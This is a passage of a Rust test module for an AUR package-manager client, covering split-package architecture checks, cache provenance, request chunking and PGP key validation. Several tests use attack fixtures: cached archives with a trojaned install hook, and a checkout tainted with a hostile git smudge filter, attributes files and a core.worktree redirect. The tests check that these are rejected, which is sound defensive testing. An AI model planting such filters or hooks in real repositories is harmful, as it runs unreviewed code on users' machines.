        || crate::config::Settings::rerun_test_unprivileged(TEST)
    {
        return Ok(());
    }
    let host = super::super::utils::current_arch()
        .expect("supported Arch test host")
        .to_string();
    let srcinfo = format!(
        "pkgbase = split\n\tpkgver = 1.0\n\tpkgrel = 1\n\tarch = {host}\npkgname = app\npkgname = docs\n\tarch = any\n"
    );
    assert_split_architecture_authorization(&srcinfo, &[("docs", "any")], true)?;
    assert_split_architecture_authorization(&srcinfo, &[("docs", &host)], false)
}

#[test]
fn split_output_architecture_rejects_base_any_for_host_override() -> Result<()> {
    const TEST: &str = "package_managers::aur::client::tests::split_output_architecture_rejects_base_any_for_host_override";
    if crate::core::testing::run_isolated_test(TEST)
        || crate::config::Settings::rerun_test_unprivileged(TEST)
    {
        return Ok(());
    }
    let host = super::super::utils::current_arch()
        .expect("supported Arch test host")
        .to_string();
    let srcinfo = format!(
        "pkgbase = split\n\tpkgver = 1.0\n\tpkgrel = 1\n\tarch = any\npkgname = app\n\tarch = {host}\npkgname = docs\n"
    );
    assert_split_architecture_authorization(&srcinfo, &[("docs", "any")], true)?;
    assert_split_architecture_authorization(&srcinfo, &[("app", &host)], true)?;
    assert_split_architecture_authorization(&srcinfo, &[("app", "any")], false)
}

#[test]
fn split_output_architecture_refuses_whole_pair_with_wrong_second_output() -> Result<()> {
    const TEST: &str = "package_managers::aur::client::tests::split_output_architecture_refuses_whole_pair_with_wrong_second_output";
    if crate::core::testing::run_isolated_test(TEST)
        || crate::config::Settings::rerun_test_unprivileged(TEST)
    {
        return Ok(());
    }
    let host = super::super::utils::current_arch()
        .expect("supported Arch test host")
        .to_string();
    let srcinfo = format!(
        "pkgbase = split\n\tpkgver = 1.0\n\tpkgrel = 1\n\tarch = {host}\npkgname = app\npkgname = docs\n\tarch = any\n"
    );
    assert_split_architecture_authorization(&srcinfo, &[("app", &host), ("docs", "any")], true)?;
    assert_split_architecture_authorization(&srcinfo, &[("app", &host), ("docs", &host)], false)
}

#[test]
fn cached_architecture_eligibility_matches_sealed_authorization() -> Result<()> {
    let dir = private_fixture_dir()?;
    let root = dir.path().canonicalize()?;
    let pkg_dir = root.join("fixture");
    std::fs::create_dir(&pkg_dir)?;
    std::fs::write(
        pkg_dir.join("PKGBUILD"),
        b"pkgname=fixture\npkgver=1.0\npkgrel=1\n",
    )?;
    let archive = root.join("fixture.pkg.tar.gz");
    let host_architecture = super::super::utils::current_arch().unwrap().to_string();
    let host = host_architecture.as_str();
    for (declared, actual, expected) in [
        ("any", None, false),
        ("any", Some("any"), true),
        (host, Some(host), true),
        ("foreign-architecture", Some("foreign-architecture"), false),
        ("any", Some(host), false),
        (host, Some("any"), false),
    ] {
        std::fs::write(
            pkg_dir.join(".SRCINFO"),
            format!(
                "pkgbase = fixture\npkgver = 1.0\npkgrel = 1\narch = {declared}\npkgname = fixture\n"
            ),
        )?;
        let mut pkginfo = "pkgname = fixture\npkgver = 1.0-1\npkgbase = fixture\n".to_string();
        if let Some(architecture) = actual {
            use std::fmt::Write;
            writeln!(pkginfo, "arch = {architecture}")?;
        }
        let buildinfo = format!(
            "format = 2\npkgname = fixture\npkgbase = fixture\npkgver = 1.0-1\npkgarch = {}\n",
            actual.unwrap_or("any")
        );
        write_tar_gz(
            &archive,
            &[
                (".PKGINFO", pkginfo.as_bytes()),
                (".BUILDINFO", buildinfo.as_bytes()),
                (".MTREE", b"#mtree\n"),
            ],
        );
        let outputs = ["fixture".to_string()];
        let cached = AurClient::select_cached_artifacts(
            vec![archive.clone()],
            &outputs,
            &pkg_dir,
            "fixture",
        )
        .is_some();
        let reviewed = ReviewedSource::capture(&pkg_dir)?;
        let authorized = AurClient::authorize_archives(
            std::slice::from_ref(&archive),
            &reviewed,
            "fixture",
            &outputs,
            false,
        );
        assert_eq!(
            authorized.is_ok(),
            expected,
            "final check: {declared:?} / {actual:?}: {authorized:?}"
        );
        assert_eq!(
            cached, expected,
            "cache eligibility: {declared:?} / {actual:?}"
        );
    }
    Ok(())
}

#[test]
fn select_cached_artifact_rejects_mismatched_install_hook() {
    // SEC-R2-01: a poisoned cache with a matching pkgname but a trojaned
    // .INSTALL hook must NEVER be installed from cache; it must fall
    // through to a fresh, reviewed rebuild.
    let dir = tempfile::tempdir().expect("temp dir");
    let pkg_dir = provenance_pkg_dir(
        dir.path(),
        "pkgbase = mypkg\npkgver = 1.0\npkgrel = 1\n\npkgname = mypkg\ninstall = mypkg.install\n",
        Some(("mypkg.install", LEGIT_INSTALL)),
    );
    let poisoned = dir.path().join("mypkg-1.0-1-x86_64.pkg.tar.gz");
    write_pkg_archive(
        &poisoned,
        "pkgname = mypkg\npkgver = 1.0-1\npkgbase = mypkg\n",
        Some(TROJAN_INSTALL),
    );

    assert_eq!(
        AurClient::select_cached_artifacts(
            vec![poisoned],
            &["mypkg".to_string()],
            &pkg_dir,
            "mypkg"
        ),
        None,
        "a cache hit whose .INSTALL hook does not match the reviewed install script must be rejected"
    );
}

#[test]
fn select_cached_artifact_accepts_verified_artifact() {
    let dir = tempfile::tempdir().expect("temp dir");
    let pkg_dir = provenance_pkg_dir(
        dir.path(),
        "pkgbase = mypkg\npkgver = 1.0\npkgrel = 1\n\npkgname = mypkg\ninstall = mypkg.install\n",
        Some(("mypkg.install", LEGIT_INSTALL)),
    );
    let genuine = dir.path().join("mypkg-1.0-1-x86_64.pkg.tar.gz");
    write_pkg_archive(
        &genuine,
        "pkgname = mypkg\npkgver = 1.0-1\npkgbase = mypkg\n",
        Some(LEGIT_INSTALL),
    );

    assert_eq!(
        AurClient::select_cached_artifacts(
            vec![genuine.clone()],
            &["mypkg".to_string()],
            &pkg_dir,
            "mypkg"
        ),
        Some(vec![genuine]),
        "a cache hit whose .PKGINFO and .INSTALL match the reviewed source must be usable"
    );
}

#[test]
fn cached_artifacts_requires_all_split_outputs_to_match_the_checkout() {
    let dir = tempfile::tempdir().expect("temp dir");
    let pkg_dir = provenance_pkg_dir(
        dir.path(),
        "pkgbase = shared\npkgver = 1.0\npkgrel = 1\n\npkgname = app\n\npkgname = libs\n",
        None,
    );
    let mut settings = Settings::default();
    settings.aur.cache_builds = true;
    let client = AurClient {
        build_dir: dir.path().to_path_buf(),
        settings,
        package_base_locks: Arc::new(dashmap::DashMap::new()),
    };
    let cache_path = client.cache_path("shared");
    std::fs::create_dir_all(cache_path.parent().unwrap()).unwrap();
    std::fs::write(cache_path, "matching-key").unwrap();
    let write_split_archive = |path: &Path, pkginfo: &str| {
        let pkginfo = format!(
            "arch = any\npackager = Fixture Maintainer <fixture@example.invalid>\n{pkginfo}"
        );
        let encoder = zstd::Encoder::new(std::fs::File::create(path).unwrap(), 0).unwrap();
        let mut archive = tar::Builder::new(encoder);
        let mut header = tar::Header::new_gnu();
        header.set_size(pkginfo.len() as u64);
        header.set_cksum();
        archive
            .append_data(&mut header, ".PKGINFO", pkginfo.as_bytes())
            .unwrap();
        archive.into_inner().unwrap().finish().unwrap();
    };
    let app = dir.path().join("app-1.0-1-x86_64.pkg.tar.zst");
    let libs = dir.path().join("libs-1.0-1-x86_64.pkg.tar.zst");
    write_split_archive(&app, "pkgname = app\npkgver = 1.0-1\npkgbase = shared\n");
    write_split_archive(&libs, "pkgname = libs\npkgver = 1.0-1\npkgbase = shared\n");
    let outputs = ["app".to_string(), "libs".to_string()];

    assert_eq!(
        AurClient::cached_artifacts("shared", &outputs, &pkg_dir, dir.path(), "matching-key"),
        None,
    );
    assert!(
        AurClient::select_cached_artifacts(vec![libs.clone(), app], &outputs, &pkg_dir, "shared")
            .is_none(),
        "archives must correspond to their requested outputs in order",
    );
    assert!(
        AurClient::select_cached_artifacts(Vec::new(), &[], &pkg_dir, "shared").is_none(),
        "empty outputs must not be treated as a cache hit",
    );

    std::fs::remove_file(&libs).unwrap();
    assert!(
        AurClient::cached_artifacts("shared", &outputs, &pkg_dir, dir.path(), "matching-key")
            .is_none(),
        "a missing split output must reject the whole cached build",
    );
    write_split_archive(&libs, "pkgname = libs\npkgver = 9.9-1\npkgbase = shared\n");
    assert!(
        AurClient::cached_artifacts("shared", &outputs, &pkg_dir, dir.path(), "matching-key")
            .is_none(),
        "a matching hash and filename must not hide one poisoned split output",
    );
}

#[test]
fn select_cached_artifact_rejects_undeclared_install_hook() {
    // No `install=` in the reviewed source: any embedded .INSTALL in the
    // cached artifact is attacker-supplied.
    let dir = tempfile::tempdir().expect("temp dir");
    let pkg_dir = provenance_pkg_dir(
        dir.path(),
        "pkgbase = mypkg\npkgver = 1.0\npkgrel = 1\n\npkgname = mypkg\n",
        None,
    );
    let poisoned = dir.path().join("mypkg-1.0-1-x86_64.pkg.tar.gz");
    write_pkg_archive(
        &poisoned,
        "pkgname = mypkg\npkgver = 1.0-1\npkgbase = mypkg\n",
        Some(TROJAN_INSTALL),
    );

    assert_eq!(
        AurClient::select_cached_artifacts(
            vec![poisoned],
            &["mypkg".to_string()],
            &pkg_dir,
            "mypkg"
        ),
        None,
        "an undeclared .INSTALL hook in a cached artifact must be rejected"
    );
}

#[test]
fn select_cached_artifact_rejects_pkginfo_identity_mismatch() {
    let dir = tempfile::tempdir().expect("temp dir");
    let pkg_dir = provenance_pkg_dir(
        dir.path(),
        "pkgbase = mypkg\npkgver = 1.0\npkgrel = 1\n\npkgname = mypkg\n",
        None,
    );
    let wrong_version = dir.path().join("mypkg-9.9-1-x86_64.pkg.tar.gz");
    write_pkg_archive(
        &wrong_version,
        "pkgname = mypkg\npkgver = 9.9-1\npkgbase = mypkg\n",
        None,
    );
    let wrong_base = dir.path().join("evil-1.0-1-x86_64.pkg.tar.gz");
    write_pkg_archive(
        &wrong_base,
        "pkgname = mypkg\npkgver = 1.0-1\npkgbase = evil\n",
        None,
    );

    assert_eq!(
        AurClient::select_cached_artifacts(
            vec![wrong_version],
            &["mypkg".to_string()],
            &pkg_dir,
            "mypkg"
        ),
        None,
        "a cache hit whose .PKGINFO version differs from the reviewed .SRCINFO must be rejected"
    );
    assert_eq!(
        AurClient::select_cached_artifacts(
            vec![wrong_base],
            &["mypkg".to_string()],
            &pkg_dir,
            "mypkg"
        ),
        None,
        "a cache hit whose .PKGINFO pkgbase differs from the reviewed package base must be rejected"
    );
}

#[test]
fn select_cached_artifact_fails_closed_without_srcinfo() {
    // Missing .SRCINFO means missing proof of provenance: fail closed.
    let dir = tempfile::tempdir().expect("temp dir");
    let pkg_dir = dir.path().join("mypkg");
    std::fs::create_dir(&pkg_dir).expect("pkg dir");
    let archive = dir.path().join("mypkg-1.0-1-x86_64.pkg.tar.gz");
    write_pkg_archive(
        &archive,
        "pkgname = mypkg\npkgver = 1.0-1\npkgbase = mypkg\n",
        None,
    );

    assert_eq!(
        AurClient::select_cached_artifacts(
            vec![archive],
            &["mypkg".to_string()],
            &pkg_dir,
            "mypkg"
        ),
        None,
        "provenance cannot be proven without .SRCINFO; must fail closed"
    );
}

#[test]
fn install_plan_for_one_split_output_installs_only_that_output() {
    // `omg install postgresql18-libs` must build the shared base once but
    // install only the requested output, never its unrequested siblings.
    let response: AurResponse = serde_json::from_str(
        r#"{
                "results": [
                    {
                        "Name": "postgresql18-libs",
                        "Version": "18.4-1",
                        "PackageBase": "postgresql18"
                    },
                    {
                        "Name": "postgresql18",
                        "Version": "18.4-1",
                        "PackageBase": "postgresql18",
                        "Depends": ["postgresql18-libs>=18.4"]
                    }
                ]
            }"#,
    )
    .expect("valid AUR RPC fixture");
    let requested = vec!["postgresql18-libs".to_string()];

    let jobs = AurClient::build_jobs_from_package_info(&requested, &response.results)
        .expect("single-output build plan");

    assert_eq!(jobs.len(), 1);
    assert_eq!(jobs[0].package, "postgresql18");
    assert_eq!(jobs[0].outputs, vec!["postgresql18-libs".to_string()]);
}

#[test]
fn update_build_jobs_include_cross_base_build_dependencies() {
    let response: AurResponse = serde_json::from_str(
        r#"{
                "results": [
                    {
                        "Name": "compiler-git",
                        "Version": "1.0-1",
                        "PackageBase": "compiler-git"
                    },
                    {
                        "Name": "application-git",
                        "Version": "1.0-1",
                        "PackageBase": "application-git",
                        "MakeDepends": ["compiler-git>=1.0"]
                    }
                ]
            }"#,
    )
    .expect("valid AUR RPC fixture");
    let requested = vec!["application-git".to_string(), "compiler-git".to_string()];

    let jobs = AurClient::build_jobs_from_package_info(&requested, &response.results)
        .expect("cross-base build plan");
    let application = jobs
        .iter()
        .find(|job| job.package == "application-git")
        .expect("application job");
    assert_eq!(application.dependencies, ["compiler-git"]);
}

#[test]
fn update_build_jobs_group_split_packages_by_aur_package_base() {
    // AUR RPC v5 reports both PostgreSQL split outputs under one PackageBase.
    // Building the output name directly creates an empty/nonexistent checkout;
    // the shared package base must be built once and both installed outputs selected.
    let response: AurResponse = serde_json::from_str(
        r#"{
                "results": [
                    {
                        "Name": "postgresql18-libs",
                        "Version": "18.4-1",
                        "PackageBase": "postgresql18",
                        "Depends": ["krb5"]
                    },
                    {
                        "Name": "postgresql18",
                        "Version": "18.4-1",
                        "PackageBase": "postgresql18",
                        "Depends": ["postgresql18-libs>=18.4"]
                    }
                ]
            }"#,
    )
    .expect("valid AUR RPC fixture");
    let requested = vec!["postgresql18-libs".to_string(), "postgresql18".to_string()];

    let jobs = AurClient::build_jobs_from_package_info(&requested, &response.results)
        .expect("split-package build plan");

    assert_eq!(jobs.len(), 1);
    assert_eq!(jobs[0].package, "postgresql18");
    assert_eq!(
        jobs[0].outputs,
        vec!["postgresql18".to_string(), "postgresql18-libs".to_string()]
    );
    assert!(jobs[0].dependencies.is_empty());
}

#[test]
fn test_chunk_aur_names_empty() {
    let names: Vec<String> = vec![];
    let chunks = AurClient::chunk_aur_names(&names);
    assert_eq!(chunks.len(), 0, "Empty input should produce zero chunks");
}

#[test]
fn test_chunk_aur_names_single() {
    let names = vec!["firefox".to_string()];
    let chunks = AurClient::chunk_aur_names(&names);
    assert_eq!(chunks.len(), 1, "Single package should produce one chunk");
    assert_eq!(chunks[0].len(), 1);
    assert_eq!(chunks[0][0], "firefox");
}

#[test]
fn test_chunk_aur_names_boundary() {
    let mut names = Vec::new();

    // URL boundary calculation: Each package adds "&arg[]=".len() (7) + name.len()
    // Base: "https://aur.archlinux.org/rpc?v=5&type=info" = 47 chars
    // Available: 4400 - 47 = 4353 chars. With 20-char names: 4353 / 27 ≈ 161 packages/chunk
    for i in 0..200 {
        names.push(format!("package-name-{i:04}"));
    }

    let chunks = AurClient::chunk_aur_names(&names);

    for (idx, chunk) in chunks.iter().enumerate() {
        let mut url_len = AUR_RPC_INFO_BASE_LEN;
        for name in chunk {
            url_len += "&arg[]=".len() + urlencoding::encode(name).len();
        }
        assert!(
            url_len <= AUR_RPC_MAX_URI,
            "Chunk {idx} has URL length {url_len} which exceeds max {AUR_RPC_MAX_URI}"
        );
    }

    let total_packages: usize = chunks.iter().map(Vec::len).sum();
    assert_eq!(
        total_packages, 200,
        "All packages must be included in chunks"
    );
}

#[test]
fn test_chunk_aur_names_long_package_names() {
    let names = vec![
        "a".repeat(100),
        "b".repeat(150),
        "c".repeat(200),
        "short".to_string(),
    ];

    let chunks = AurClient::chunk_aur_names(&names);

    for chunk in &chunks {
        let mut url_len = AUR_RPC_INFO_BASE_LEN;
        for name in chunk {
            url_len += "&arg[]=".len() + urlencoding::encode(name).len();
        }
        assert!(url_len <= AUR_RPC_MAX_URI);
    }

    let total: usize = chunks.iter().map(Vec::len).sum();
    assert_eq!(total, 4);
}

#[test]
fn chunk_aur_names_accounts_for_percent_encoding() {
    let names = (0..220)
        .map(|index| format!("package+variant+{index:04}"))
        .collect::<Vec<_>>();

    let chunks = AurClient::chunk_aur_names(&names);
    assert!(chunks.len() > 1, "encoded request must be split");
    for chunk in chunks {
        let url_len = chunk.iter().fold(AUR_RPC_INFO_BASE_LEN, |length, name| {
            length + "&arg[]=".len() + urlencoding::encode(name).len()
        });
        assert!(url_len <= AUR_RPC_MAX_URI, "wire URI length was {url_len}");
    }
}

#[test]
fn test_chunk_aur_names_exactly_at_boundary() {
    let available = AUR_RPC_MAX_URI - AUR_RPC_INFO_BASE_LEN;

    // Formula: arg_size = "&arg[]=".len() + pkg_name.len() = 7 + 10 = 17 chars/pkg
    let arg_size = "&arg[]=".len() + 10;
    let count = available / arg_size;

    let names: Vec<String> = (0..count).map(|i| format!("pkg{i:06}")).collect();
    let chunks = AurClient::chunk_aur_names(&names);

    assert_eq!(chunks.len(), 1, "Should fit exactly in one chunk");
    assert_eq!(chunks[0].len(), count);
}

#[test]
fn test_has_word_boundary_match_start() {
    assert!(has_word_boundary_match("firefox-bin", "firefox"));
    assert!(has_word_boundary_match("firefox", "firefox"));
}

#[test]
fn test_has_word_boundary_match_after_separator() {
    assert!(has_word_boundary_match("visual-studio-code", "studio"));
    assert!(has_word_boundary_match("lib_test_util", "test"));
    assert!(has_word_boundary_match("package.name", "name"));
}

#[test]
fn test_has_word_boundary_match_no_match_substring() {
    assert!(!has_word_boundary_match("firefox-bin", "irefox"));
    assert!(!has_word_boundary_match("libtest", "test"));
    assert!(!has_word_boundary_match("mypackage", "pack"));
}

#[test]
fn test_has_word_boundary_match_empty() {
    assert!(has_word_boundary_match("firefox", ""));
    assert!(!has_word_boundary_match("", "firefox"));
    assert!(has_word_boundary_match("", ""));
}

#[test]
fn test_has_word_boundary_match_case_sensitive() {
    assert!(has_word_boundary_match("Firefox-Bin", "Firefox"));
    assert!(!has_word_boundary_match("firefox-bin", "Firefox"));
}

// ────────────────────────────────────────────────────────────────────────
// PGP Key ID Validation Tests
// ────────────────────────────────────────────────────────────────────────

#[test]
fn test_pgp_key_id_full_fingerprint() {
    // 40-char fingerprint - most secure
    let fingerprint = "ABCDEF1234567890ABCDEF1234567890ABCDEF12";
    assert_eq!(
        validate_pgp_key_id(fingerprint),
        PgpKeyIdStatus::FullFingerprint
    );
}

#[test]
fn test_pgp_key_id_long_key_id() {
    // 16-char long key ID - acceptable
    let long_id = "ABCDEF1234567890";
    assert_eq!(validate_pgp_key_id(long_id), PgpKeyIdStatus::LongKeyId);
}

#[test]
fn test_pgp_key_id_short_key_id_rejected() {
    // 8-char short key ID - VULNERABLE to collision attacks
    let short_id = "ABCDEF12";
    assert_eq!(validate_pgp_key_id(short_id), PgpKeyIdStatus::ShortKeyId);
}

#[test]
fn test_pgp_key_id_very_short_rejected() {
    // Any ID < 16 chars is treated as short (vulnerable)
    assert_eq!(validate_pgp_key_id("ABCDEF"), PgpKeyIdStatus::ShortKeyId);
    assert_eq!(validate_pgp_key_id("AB"), PgpKeyIdStatus::ShortKeyId);
}

#[test]
fn test_pgp_key_id_empty() {
    assert_eq!(validate_pgp_key_id(""), PgpKeyIdStatus::Empty);
}

#[test]
fn test_pgp_key_id_too_long() {
    // More than 64 chars is invalid
    let too_long = "A".repeat(65);
    assert_eq!(validate_pgp_key_id(&too_long), PgpKeyIdStatus::TooLong);
}

#[test]
fn test_pgp_key_id_boundary_64_chars_is_not_too_long() {
    // Exactly 64 hex chars must pass the length limit and fall through to
    // the non-standard-length classification (not be rejected as TooLong).
    let max_hex = "A".repeat(64);
    assert_eq!(
        validate_pgp_key_id(&max_hex),
        PgpKeyIdStatus::NonStandardLength
    );
}

#[test]
fn test_pgp_key_id_invalid_chars() {
    // Non-hexadecimal characters
    assert_eq!(
        validate_pgp_key_id("GHIJKL1234567890"),
        PgpKeyIdStatus::InvalidChars
    );
    assert_eq!(
        validate_pgp_key_id("ABCDEF12!@#$%^&*"),
        PgpKeyIdStatus::InvalidChars
    );
}

#[test]
fn test_pgp_key_id_non_standard_length() {
    // Valid hex but non-standard length (e.g., 20 chars)
    let non_standard = "ABCDEF1234567890ABCD";
    assert_eq!(
        validate_pgp_key_id(non_standard),
        PgpKeyIdStatus::NonStandardLength
    );
}

#[test]
fn test_pgp_key_id_lowercase_hex() {
    // Lowercase hex should be valid (a-f)
    let lowercase = "abcdef1234567890";
    assert_eq!(validate_pgp_key_id(lowercase), PgpKeyIdStatus::LongKeyId);
}

#[test]
fn test_pgp_key_id_mixed_case() {
    // Mixed case should be valid
    let mixed = "AbCdEf1234567890";
    assert_eq!(validate_pgp_key_id(mixed), PgpKeyIdStatus::LongKeyId);
}

#[test]
fn require_fetchable_pgp_key_id_accepts_long_and_fingerprint() {
    require_fetchable_pgp_key_id("ABCDEF1234567890").expect("long key id");
    require_fetchable_pgp_key_id("ABCDEF1234567890ABCDEF1234567890ABCDEF12").expect("fingerprint");
}

#[test]
fn require_fetchable_pgp_key_id_rejects_short_and_invalid() {
    let short =
        require_fetchable_pgp_key_id("ABCDEF12").expect_err("short key ids must not be skipped");
    assert!(
        short.to_string().contains("short PGP key ID"),
        "got: {short}"
    );
    let invalid = require_fetchable_pgp_key_id("GHIJKL1234567890")
        .expect_err("non-hex key ids must not be skipped");
    assert!(
        invalid.to_string().contains("non-hex chars"),
        "got: {invalid}"
    );
}

#[cfg(feature = "pgp")]
#[test]
fn package_scoped_pgp_home_contains_public_keys_without_secret_material() {
    use crate::core::security::keyserver;

    if which::which("gpg").is_err() {
        return;
    }
    let source_home = private_fixture_dir().unwrap();
    let cache_dir = private_fixture_dir().unwrap();
    let identity = format!(
        "OMG scoped keyring test {} <test@example.invalid>",
        uuid::Uuid::new_v4()
    );
    let generated = std::process::Command::new("gpg")
        .args([
            "--no-options",
            "--batch",
            "--pinentry-mode",
            "loopback",
            "--passphrase",
            "",
            "--homedir",
        ])
        .arg(source_home.path())
        .args(["--quick-generate-key", &identity, "ed25519", "sign", "1d"])
        .output()
        .unwrap();
    assert!(
        generated.status.success(),
        "{}",
        String::from_utf8_lossy(&generated.stderr)
    );
    let listing = std::process::Command::new("gpg")
        .args([
            "--no-options",
            "--batch",
            "--with-colons",
            "--fingerprint",
            "--homedir",
        ])
        .arg(source_home.path())
        .args(["--list-keys", &identity])
        .output()
        .unwrap();
    let fingerprint = String::from_utf8_lossy(&listing.stdout)
        .lines()
        .find_map(|line| {
            let fields: Vec<_> = line.split(':').collect();
            (fields.first() == Some(&"fpr"))
                .then(|| fields.get(9).copied())
                .flatten()
        })
        .expect("generated key fingerprint")
        .to_string();

    let scoped = create_scoped_pgp_home(
        std::slice::from_ref(&fingerprint),
        source_home.path(),
        cache_dir.path(),
    )
    .unwrap();
    assert_eq!(
        std::fs::metadata(scoped.path())
            .unwrap()
            .permissions()
            .mode()
            & 0o777,
        0o700,
        "package-scoped keyrings must be private at creation"
    );
    assert_eq!(
        std::fs::metadata(scoped.path().join("trusted-keys.pgp"))
            .unwrap()
            .permissions()
            .mode()
            & 0o777,
        0o600,
        "the staged key bundle must be private"
    );
    assert!(keyserver::is_key_in_gnupg(&fingerprint, scoped.path()).unwrap());
    let secrets = std::process::Command::new("gpg")
        .args(["--no-options", "--batch", "--with-colons", "--homedir"])
        .arg(scoped.path())
        .arg("--list-secret-keys")
        .output()
        .unwrap();
    assert!(
        secrets.status.success(),
        "failed to list package-scoped secret keys: {}",
        String::from_utf8_lossy(&secrets.stderr)
    );
    assert!(
        !String::from_utf8_lossy(&secrets.stdout)
            .lines()
            .any(|line| line.starts_with("sec:")),
        "package-scoped keyrings must not expose the user's secret keys"
    );
}

#[tokio::test]
async fn aur_refresh_discards_tainted_git_configuration_and_dirty_sources() {
    let temp = tempfile::tempdir().unwrap();
    let remote = temp.path().join("remote.git");
    let seed = temp.path().join("seed");
    let checkout = temp.path().join("checkout");

    let git = |args: &[&std::ffi::OsStr]| {
        std::process::Command::new("git")
            .args(args)
            .output()
            .unwrap()
    };
    assert!(
        git(&["init".as_ref(), "--bare".as_ref(), remote.as_os_str()])
            .status
            .success()
    );
    assert!(
        git(&[
            "-C".as_ref(),
            remote.as_os_str(),
            "config".as_ref(),
            "uploadpack.allowFilter".as_ref(),
            "true".as_ref(),
        ])
        .status
        .success()
    );
    assert!(git(&["init".as_ref(), seed.as_os_str()]).status.success());
    assert!(
        git(&[
            "-C".as_ref(),
            seed.as_os_str(),
            "config".as_ref(),
            "user.email".as_ref(),
            "test@example.invalid".as_ref(),
        ])
        .status
        .success()
    );
    assert!(
        git(&[
            "-C".as_ref(),
            seed.as_os_str(),
            "config".as_ref(),
            "user.name".as_ref(),
            "OMG test".as_ref(),
        ])
        .status
        .success()
    );
    assert!(
        git(&[
            "-C".as_ref(),
            seed.as_os_str(),
            "config".as_ref(),
            "commit.gpgsign".as_ref(),
            "false".as_ref(),
        ])
        .status
        .success()
    );
    std::fs::write(seed.join("PKGBUILD"), "pkgver=1\n").unwrap();
    assert!(
        git(&[
            "-C".as_ref(),
            seed.as_os_str(),
            "add".as_ref(),
            "PKGBUILD".as_ref(),
        ])
        .status
        .success()
    );
    assert!(
        git(&[
            "-C".as_ref(),
            seed.as_os_str(),
            "commit".as_ref(),
            "-m".as_ref(),
            "initial".as_ref(),
        ])
        .status
        .success()
    );
    assert!(
        git(&[
            "-C".as_ref(),
            seed.as_os_str(),
            "remote".as_ref(),
            "add".as_ref(),
            "origin".as_ref(),
            remote.as_os_str(),
        ])
        .status
        .success()
    );
    assert!(
        git(&[
            "-C".as_ref(),
            seed.as_os_str(),
            "push".as_ref(),
            "-u".as_ref(),
            "origin".as_ref(),
            "HEAD".as_ref(),
        ])
        .status
        .success()
    );
    assert!(
        git(&["clone".as_ref(), remote.as_os_str(), checkout.as_os_str(),])
            .status
            .success()
    );
    std::fs::write(checkout.join("PKGBUILD"), "pkgver=2\n").unwrap();

    // Taint the checkout the way a sandboxed PKGBUILD can. Each vector
    // reaches Git state that `git clean -fd` never removes, so an in-place
    // refresh would execute the filter on the host.
    let marker = temp.path().join("filter-executed");
    let filter = format!("touch {}; cat", marker.display());
    assert!(
        git(&[
            "-C".as_ref(),
            checkout.as_os_str(),
            "config".as_ref(),
            "filter.hostile.smudge".as_ref(),
            filter.as_ref()
        ])
        .status
        .success()
    );
    // 1. Work-tree attributes (the only vector the previous test covered).
    std::fs::write(checkout.join(".gitattributes"), "* filter=hostile\n").unwrap();
    // 2. Repository-local attributes, which outrank the work tree.
    std::fs::create_dir_all(checkout.join(".git/info")).unwrap();
    std::fs::write(checkout.join(".git/info/attributes"), "* filter=hostile\n").unwrap();
    // 3. A config-selected attributes file outside the work tree.
    let external_attributes = temp.path().join("external-attributes");
    std::fs::write(&external_attributes, "* filter=hostile\n").unwrap();
    assert!(
        git(&[
            "-C".as_ref(),
            checkout.as_os_str(),
            "config".as_ref(),
            "core.attributesFile".as_ref(),
            external_attributes.as_os_str(),
        ])
        .status
        .success()
    );
    // 4. A config-selected working tree pointing outside the checkout.
    let outside = temp.path().join("outside");
    std::fs::create_dir_all(&outside).unwrap();
    std::fs::write(outside.join("precious.txt"), "keep\n").unwrap();
    assert!(
        git(&[
            "-C".as_ref(),
            checkout.as_os_str(),
            "config".as_ref(),
            "core.worktree".as_ref(),
            outside.as_os_str(),
        ])
        .status
        .success()
    );

    let client = AurClient {
        build_dir: temp.path().to_path_buf(),
        settings: Settings::default(),
        package_base_locks: Arc::new(dashmap::DashMap::new()),
    };
    client
        .refresh_checkout_from(&checkout, remote.to_str().unwrap())
        .await
        .unwrap();
    assert!(
        !marker.exists(),
        "a tainted checkout must never execute a Git filter on the host"
    );
    assert!(
        outside.join("precious.txt").exists(),
        "a tainted core.worktree must never redirect Git outside the checkout"
    );
    assert!(!checkout.join(".gitattributes").exists());
    assert!(
        !checkout.join(".git/info/attributes").exists(),
        "repository-local attributes must not survive a refresh"
    );
    assert_eq!(
        std::fs::read_to_string(checkout.join("PKGBUILD")).unwrap(),
        "pkgver=1\n",
        "the checkout must be re-cloned from the remote, discarding local edits"
    );
}

#[tokio::test]
async fn refresh_checkout_from_fetches_new_origin_commit() {
    let temp = tempfile::tempdir().unwrap();
    let remote = temp.path().join("remote.git");
    let seed = temp.path().join("seed");
    let checkout = temp.path().join("pkg");

    let git = |args: &[&std::ffi::OsStr]| {
        std::process::Command::new("git")
            .args(args)
            .output()
            .unwrap()
    };
    assert!(
        git(&["init".as_ref(), "--bare".as_ref(), remote.as_os_str()])
            .status
            .success()
    );
    assert!(
        git(&[
            "-C".as_ref(),
            remote.as_os_str(),
            "config".as_ref(),
            "uploadpack.allowFilter".as_ref(),
            "true".as_ref(),
        ])
        .status
        .success()
    );
    assert!(git(&["init".as_ref(), seed.as_os_str()]).status.success());
    for (key, value) in [
        ("user.email", "test@example.invalid"),
        ("user.name", "OMG test"),
        ("commit.gpgsign", "false"),
    ] {
        assert!(
            git(&[
                "-C".as_ref(),
                seed.as_os_str(),
                "config".as_ref(),
                key.as_ref(),
                value.as_ref(),
            ])
            .status
            .success()
        );
    }
    std::fs::write(seed.join("PKGBUILD"), "pkgver=1\n").unwrap();
    assert!(
        git(&[
            "-C".as_ref(),
            seed.as_os_str(),
            "add".as_ref(),
            "PKGBUILD".as_ref(),
        ])
        .status
        .success()
    );
    assert!(
        git(&[
            "-C".as_ref(),
            seed.as_os_str(),
            "commit".as_ref(),
            "-m".as_ref(),
            "initial".as_ref(),
        ])
        .status
        .success()
    );
    assert!(
        git(&[
            "-C".as_ref(),
            seed.as_os_str(),
            "remote".as_ref(),
            "add".as_ref(),
            "origin".as_ref(),
            remote.as_os_str(),
        ])
        .status
        .success()
    );
    assert!(
        git(&[
            "-C".as_ref(),
            seed.as_os_str(),
            "push".as_ref(),
            "-u".as_ref(),
            "origin".as_ref(),
            "HEAD".as_ref(),
        ])
        .status
        .success()
    );
    assert!(
        git(&["clone".as_ref(), remote.as_os_str(), checkout.as_os_str()])
            .status
            .success()
    );
    std::fs::write(seed.join("new-file"), "from-origin\n").unwrap();
    assert!(
        git(&[
            "-C".as_ref(),
            seed.as_os_str(),
            "add".as_ref(),
            "new-file".as_ref(),
        ])
        .status
        .success()
    );
    assert!(
        git(&[
            "-C".as_ref(),
            seed.as_os_str(),
            "commit".as_ref(),
            "-m".as_ref(),
